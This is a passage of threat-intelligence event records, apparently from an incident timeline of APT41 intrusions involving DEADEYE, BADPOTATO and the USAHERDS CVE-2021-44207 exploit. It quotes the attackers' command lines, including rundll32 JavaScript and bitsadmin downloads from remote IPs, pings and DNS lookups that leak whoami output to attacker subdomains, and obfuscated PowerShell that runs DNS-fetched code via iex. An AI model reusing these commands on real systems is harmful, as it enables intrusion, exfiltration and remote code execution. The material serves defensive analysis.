'2021-06-14T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--bcbcfe18-d4ce-5dc1-a8be-2266a5dfa5a6', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': '"cmd" /c rundll32 C:\\Users\\public\\syslog.dll,rdpwsx'}], 'malware': [{'type': 'malware', 'id': 'malware--0514a150-7c5a-512f-bec2-8aa51cbcb8b1', 'name': 'DEADEYE', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--36f908a1-261e-5ebc-b1a4-89cf9531cc0d', 'name': 'Arbitrary payload execution using rundll32', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--457c7820-d331-465a-915e-42f85500ccc4', 'name': 'System Binary Proxy Execution', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218', 'tactics': ['Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5', 'name': 'Rundll32', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218.011', 'tactics': ['Defense Evasion']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Payload Launch', 'analyst_brief': 'After being re-combined the DEADEYE payload was launched using "rundll32.exe".'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-22T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--6bd2254b-1154-5bc7-84c8-00bcfa18828e', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': 'cmd.exe /c ping %userdomain%.ns.time12.cf'}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--78b289c3-f158-5d72-8dd5-55197fb784b2', 'name': 'Arbitrary payload execution using cmd.exe', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830', 'name': 'Command and Scripting Interpreter', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059', 'tactics': ['Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62', 'name': 'Windows Command Shell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059.003', 'tactics': ['Execution']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Connectivity Check', 'analyst_brief': 'Built-in "ping" command was used to send an ICMP request to victim-specific subdomain of "ns.time12.cf"'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-10-17T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--7a0c9259-13b2-583c-958a-b7c876299e64', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': 'b.exe  c:\\\\programdata\\\\a.exe'}], 'malware': [{'type': 'malware', 'id': 'malware--8e99e597-dda4-57dc-be6e-f1bc8b80a5f3', 'name': 'BADPOTATO', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--ae0d50d8-79de-5193-9223-178fde2c0756', 'name': 'Privilege escalation via access token impersonation', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d', 'name': 'Token Impersonation/Theft', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1134.001', 'tactics': ['Privilege Escalation', 'Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48', 'name': 'Access Token Manipulation', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1134', 'tactics': ['Privilege Escalation', 'Defense Evasion']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Payload Launched', 'analyst_brief': 'BADPOTATO Privilege Escalation tool "b.exe" used to launch unknown payload "a.exe"'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-06-14T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--4d836656-0458-5c41-971b-dfab7f56abdd', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': '$a=whoami;ping ([System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($a)).replace(\'-\',\'\')+".ns.time12.cf")'}], 'tools': [{'type': 'malware', 'id': 'malware--f872b3e0-c277-5716-baae-885a9c410398', 'name': 'WHOAMI', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--c5ecdc1a-7976-5cb8-84a1-387fda9ac3c9', 'name': 'Use of ICMP', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b', 'name': 'Non-Application Layer Protocol', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1095', 'tactics': ['Command and Control']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--b1f68c17-e8fd-5023-be31-d774a1e69e2b', 'name': 'Datamine system users', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104', 'name': 'System Owner/User Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1033', 'tactics': ['Discovery']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Internal Reconnaissance', 'analyst_brief': 'The output of a "whoami" command was prepended to the subdomain of Cloudflare proxied infrastructure.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-02T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--3c9c65f8-ace2-5d6f-91ad-3b36f4bc7d0a', 'name': 'Event Log ID: 1316 \| Information \| Event code: 4009-++-Viewstate verification failed. Reason: The viewstate supplied failed integrity check.', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--926c0c9e-3dfe-54d9-8246-89c2c5315b4b', 'name': 'Exploitation of Microsoft products', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c', 'name': 'Exploit Public-Facing Application', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1190', 'tactics': ['Initial Access']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': '.NET Web Application Exploited', 'analyst_brief': 'A publicly accessible web application vulnerable to .NET Deserialization was exploited using the publicly-available YSOSERIAL to generate malicious ViewState payloads'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-10-17T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--38071e05-e1da-520d-9fd7-7b4283c533f3', 'name': 'Full Path: C:\\ProgramData\\SymEFASI\\SymEFASI.dat', 'attribution_scope': 'confirmed', 'releasable': True}], 'malware': [{'type': 'malware', 'id': 'malware--81b043a3-44c5-526a-af8c-b2730ba3bfbb', 'name': 'DEADEYE.APPEND', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--59d8f4a8-a6c6-5d9b-9d86-19f0616b54ff', 'name': 'Mimics a legitimate file name', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0', 'name': 'Masquerading', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1036', 'tactics': ['Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2', 'name': 'Match Legitimate Name or Location', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1036.005', 'tactics': ['Defense Evasion']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Payload Dropped', 'analyst_brief': 'APT41 dropped the DEADEYE.APPEND dropper'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-23T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--4d1bd69a-59f5-536b-a66e-e606eee99fd9', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': "cmd.exe /c rundll32.exe javascript:'\\..\\mshtml,RunHTMLApplication ';document.write();h=new%20ActiveXObject('WinHttp.WinHttpRequest.5.1');h.Open('GET','http:<span>//</span>67.205.132.162/a.txt',false);h.Send();"}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--36f908a1-261e-5ebc-b1a4-89cf9531cc0d', 'name': 'Arbitrary payload execution using rundll32', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--457c7820-d331-465a-915e-42f85500ccc4', 'name': 'System Binary Proxy Execution', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218', 'tactics': ['Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5', 'name': 'Rundll32', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218.011', 'tactics': ['Defense Evasion']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--78b289c3-f158-5d72-8dd5-55197fb784b2', 'name': 'Arbitrary payload execution using cmd.exe', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830', 'name': 'Command and Scripting Interpreter', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059', 'tactics': ['Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62', 'name': 'Windows Command Shell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059.003', 'tactics': ['Execution']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Payload Download', 'analyst_brief': 'Rundll32.exe was used to launch in-line javascript written to download a payload from a remote staging server via HTTP GET request.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-05T00:00:00.000Z', 'attributions': {'releasable': True, 'tools': [{'type': 'malware', 'id': 'malware--e224f74a-ca0e-540b-884f-03753787316f', 'name': 'NLTEST', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--657334e9-ebf3-5dfa-b21d-dae05a8b5370', 'name': 'Datamine Active Directory Trusts', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0', 'name': 'Domain Trust Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1482', 'tactics': ['Discovery']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'NLTEST Launched', 'analyst_brief': 'As part of their initial recon, NLTEST was utilized to gather data about the Active Directory environment.'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-07-04T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--80cd77c6-aa8a-50a5-8f05-bbc02c6d751a', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': "ping ((C:\\Windows\\System32\\inetsrv\\appcmd.exe list vdir\|findstr /v %)[0].split('()')[1].replace('physicalPath:','').replace('\\','.').replace(':','').replace(' ','-').replace('_','-').replace(' ','-')+'.728c10b8.dns.1433.eu.org')"}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Connectivity Check', 'analyst_brief': 'ICMP requests were sent to the remote subdomain of the free subdomain service EU.org in order to confirm connectivity.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-05T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--b74d8e3e-c710-5a1a-aa4a-70a1413cdbd6', 'name': 'EventLogItem:genTime writeTime \| 201 \| Information \| Task Scheduler successfully completed task \\Microsoft\\Windows\\WDI\\USOShared" , instance "%windir%\\\\system32\\\\rundll32.exe" , action "{e157d5ba-9eb8-4178-8140-73eb21b9d735}" ."', 'attribution_scope': 'confirmed', 'releasable': True}], 'malware': [{'type': 'malware', 'id': 'malware--0514a150-7c5a-512f-bec2-8aa51cbcb8b1', 'name': 'DEADEYE', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--36f908a1-261e-5ebc-b1a4-89cf9531cc0d', 'name': 'Arbitrary payload execution using rundll32', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--457c7820-d331-465a-915e-42f85500ccc4', 'name': 'System Binary Proxy Execution', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218', 'tactics': ['Defense Evasion']}, {'type': 'attack-pattern', 'id': 'attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5', 'name': 'Rundll32', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1218.011', 'tactics': ['Defense Evasion']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--21073825-af1e-5d63-81b1-f5912d3144b0', 'name': 'Arbitrary command execution with a scheduled task', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9', 'name': 'Scheduled Task/Job', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1053', 'tactics': ['Privilege Escalation', 'Persistence', 'Execution']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Scheduled Task Launched', 'analyst_brief': 'APT41 leveraged Windows scheduled tasks for persistence of their DEADEYE droppers.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-12-05T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--1420cfcf-68b7-58fe-a038-e9aa51574ec4', 'name': 'Full Path: "C:\\ProgramData\\winlog.log" - created by the legitimate IIS Process \'w3wp.exe\'.', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e1f4a21b-4d2f-5096-aa85-6fed53cc061c', 'name': 'Creating a file', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Payload Dropped', 'analyst_brief': 'While Mandiant did not successfully acquire the file bytes for this event, evidence existed to suggest it was a "SweetPotato" payload dropped to disk directly from USAHERDS exploitation.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-07-04T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--eccf0097-4f21-5d5c-8d32-763a4e06318c', 'name': 'Exploit Payload using PowerShell: "ping -n 1 ((cmd /c dir c:\\\|findstr Number).split()[-1]+\'.728c10b8.dns.1433.eu.org\')"', 'attribution_scope': 'confirmed', 'releasable': True}], 'vulnerabilities': [{'type': 'vulnerability', 'id': 'vulnerability--362764b4-aa15-55fd-a68b-caf84f25a6b0', 'attribution_scope': 'confirmed', 'releasable': True, 'cve_id': 'CVE-2021-44207'}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--1662ed30-9001-56a4-965f-2a15909b0431', 'name': 'Lists directories', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18', 'name': 'File and Directory Discovery', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1083', 'tactics': ['Discovery']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--57c9f36f-0348-510b-bed6-8564918c43f9', 'name': 'Use of PowerShell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830', 'name': 'Command and Scripting Interpreter', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059', 'tactics': ['Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736', 'name': 'PowerShell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059.001', 'tactics': ['Execution']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'USAHerds .NET Web Application Exploited', 'analyst_brief': "This is the first event relating to APT41's exploitation of their zero-day vulnerability CVE-2021-44207 in the USAHERDS web application."},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-05T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--fb5a596d-ab47-5b0f-b198-9064725ebf15', 'name': 'FileItem:Created Modified Accessed Changed FilenameCreated FilenameModified FilenameAccessed FilenameChanged \| C:\\Users\\Public\\system.hiv', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--aaa71b54-2de3-56f8-a4b9-49619aaa6686', 'name': 'Local Staging Directory', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e', 'name': 'Data Staged', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074', 'tactics': ['Collection']}, {'type': 'attack-pattern', 'id': 'attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c', 'name': 'Local Data Staging', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1074.001', 'tactics': ['Collection']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--75ba9f27-fff1-57ed-83d2-f80d4c9827fb', 'name': 'Datamine Windows registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896', 'name': 'Query Registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1012', 'tactics': ['Discovery']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--5bbdf932-85bc-5c16-a073-d47a740a96b7', 'name': 'Datamine credentials stored by Windows registry.', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517', 'name': 'Unsecured Credentials', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1552', 'tactics': ['Credential Access']}, {'type': 'attack-pattern', 'id': 'attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580', 'name': 'Credentials in Registry', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1552.002', 'tactics': ['Credential Access']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Credential Harvesting', 'analyst_brief': 'The SYSTEM Registry Hive was dumped and saved to disk.'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-07-04T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--4651910e-beef-5fa5-b5a4-c60cfb1e4123', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': 'C:\\\\Windows\\\\System32\\\\cmd.exe /c bitsadmin /transfer n http:<span>//</span>149.28.15.152/k.pdf C:\\\\Users\\\\Public\\\\k.pdf'}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--38ecb188-e04e-508a-b123-1bf96fe9b4f7', 'name': 'Download using BitsAdmin', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add', 'name': 'Ingress Tool Transfer', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1105', 'tactics': ['Command and Control']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Payload Download', 'analyst_brief': 'BITSADMIN was used to download an unknown payload, purporting to be a PDF file, from a remote staging server. Mandiant was unable to recover this file for analysis.'},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-05T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--40d7dbee-c7f5-5336-8102-83255680403a', 'name': 'Full Path: D:\\inetpub\\wwwroot\\<REDACTED>\\bin\\dsquery.exe', 'attribution_scope': 'confirmed', 'releasable': True}], 'tools': [{'type': 'malware', 'id': 'malware--fed3481f-0095-53f2-8c32-7e286013233b', 'name': 'DSQUERY', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--42d4b769-2156-5559-8b39-a0805b15c404', 'name': 'Datamine Active Directory data', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': []}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'DSQUERY Launched', 'analyst_brief': "A DSQUERY payload was dropped into a subdirectory of the server's web directory and launched for internal recon."},<br/>{'name': 'Event', 'description': 'Key Event', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-05T00:00:00.000Z', 'attributions': {'releasable': True, 'events': [{'type': 'event', 'id': 'event--3adedbac-231d-5e11-ad94-45d343b3e350', 'name': 'Logs:<REDACTED>:IIS \| GET /<REDACTED>/test.txt - 80 - Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:88.0)+Gecko/20100101+Firefox/88.0 - 200 0 0 93', 'attribution_scope': 'confirmed', 'releasable': True}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--8154ff97-5013-5fbe-815f-2b4ae13c734a', 'name': 'Malicious use of HTTP', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161', 'name': 'Web Protocols', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071.001', 'tactics': ['Command and Control']}, {'type': 'attack-pattern', 'id': 'attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6', 'name': 'Application Layer Protocol', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071', 'tactics': ['Command and Control']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--1a0c3769-c5c9-5d94-8273-f638c4ed72ec', 'name': 'Exfiltration over web service', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807', 'name': 'Exfiltration Over Web Service', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1567', 'tactics': ['Exfiltration']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Data Exfiltration', 'analyst_brief': 'During the initial reconnaissance phase, APT41 redirected command output to a file named "test.txt" within the publicly accessible "wwwroot" directory on the web server. A simple HTTP GET Request was then sent to the server for the file to exfiltrate and review the captured recon information.'},<br/>{'name': 'Host Command', 'description': 'Key Host Command', 'releasable': True, 'event_type': 'key_event', 'timestamp': '2021-05-23T00:00:00.000Z', 'attributions': {'releasable': True, 'host_commands': [{'type': 'hostcmd', 'id': 'hostcmd--bafcd5c9-9028-5f44-b425-6491d58f6023', 'attribution_scope': 'confirmed', 'releasable': True, 'command_line': '$a=Get-Random +1;$b=\'FromBase\'+\'NoneString\'.Replace(\'None\',192/($a+3));[Text.Encoding]::UTF8.GetString([convert].GetMethod($b,[type[]]@(\'String\')).Invoke($null,((nslookup -qt=TXT -timeout=60 "q.Auth.ns.time12.cf" \|Out-String).split("\`n")\|%{$_.Split(\'"\')[1]}\|Out-String).Replace("\`n","")))\|iex'}], 'mandiant_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--59d2e23c-a76b-573a-bd0f-f57097dc368f', 'name': 'Use of DNS', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6', 'name': 'Application Layer Protocol', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071', 'tactics': ['Command and Control']}, {'type': 'attack-pattern', 'id': 'attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72', 'name': 'DNS', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1071.004', 'tactics': ['Command and Control']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--77637ab2-8d9f-5791-8c62-e23d6e6b4acf', 'name': 'Download using PowerShell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add', 'name': 'Ingress Tool Transfer', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1105', 'tactics': ['Command and Control']}]}, {'type': 'attack-pattern', 'id': 'attack-pattern--57c9f36f-0348-510b-bed6-8564918c43f9', 'name': 'Use of PowerShell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_techniques': [{'type': 'attack-pattern', 'id': 'attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830', 'name': 'Command and Scripting Interpreter', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059', 'tactics': ['Execution']}, {'type': 'attack-pattern', 'id': 'attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736', 'name': 'PowerShell', 'attribution_scope': 'confirmed', 'releasable': True, 'mitre_id': 'T1059.001', 'tactics': ['Execution']}]}], 'actors': [{'type': 'threat-actor', 'id': 'threat-actor--9c88bd9c-f41b-59fa-bfb6-427b1755ea64', 'name': 'APT41', 'attribution_scope': 'confirmed', 'releasable': True}]}, 'brief': 'Decoded PowerShell Command'},<br/>{'name': 'X509', 'description': 'New x509 SSL Certificate Created', 